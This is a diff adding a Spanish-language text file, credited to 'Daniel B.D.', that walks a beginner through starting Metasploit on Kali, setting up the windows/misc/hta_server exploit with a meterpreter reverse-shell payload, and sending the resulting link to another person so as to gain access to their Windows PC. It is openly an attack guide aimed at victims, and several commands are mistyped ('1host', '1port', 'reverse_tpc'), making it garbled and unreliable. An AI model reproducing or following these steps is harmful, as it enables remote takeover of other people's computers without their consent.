@@ -1,0 +1,66 @@
+ESTE >VIRUS< FUNCIONA SOLO PARA WINDOWS
+
+Habilitar [SandBox o Espacio Aislado de Windows] en windows
+Instalar/Descargar [Linux-Kali]
+			[Kali]= Sistema Operativo hecho en [Linux] que sirve para hackear
+
+Dentro de [Kali] ir al "cmd" o como se llame en ese sistema operativo.
+
+Antes de empezar, cada vez que diga ESCRIBE ESTO:, debajo mostraré el comando, después de escribir ese comando 
+dale siempre a ENTER.
+
+==================================================================================================================
+
+ESCRIBIR ESTO:
+
+ifconfig
+
+(Debajo aparecerá "inet" y al lado la IP del dispositivo, "inet" aparecerá en la 1º línea. Ahora copia la IP)
+
+Cierra el "cmd" y vuelve a abrirlo
+
+ESCRIBE ESTO:
+
+msfconsole
+
+ESCRIBE ESTO:
+
+use exploit/windows/misc/hta_server
+
+ESCRIBE ESTO:
+
+set 1host (Pega la IP que copiaste AQUÍ)
+
+ESCRIBE ESTO:
+
+set srvhost (Pega la IP que copiaste AQUÍ)
+
+ESCRIBE ESTO:
+
+set payload windows/meterpreter/reverse_tpc
+
+ESCRIBE ESTO:
+
+set 1port 8111
+
+ESCRIBE ESTO:
+
+exploit
+
+========================================================================================================================
+
+Cuando hallas escrito el último comando, te estará apareciendo un link abajo del todo.
+
+Ese link es el que contiene tu >Virus<. Si se lo mandas a alguien y esa persona entra
+en el link y descarga el archivo de dentro, podrás obtener acceso a su pc.
+
+CUANDO LA PERSONA ENTRE, PODRÁS TENER ACCESO A SU PC DESDE EL "CMD" QUE ESTABAS USANDO EN KALI.
+
+LINK FUNCIONA SOLO PARA WINDOWS
+
+
+
+
+
+				===Créditos a: Daniel B.D.===
+
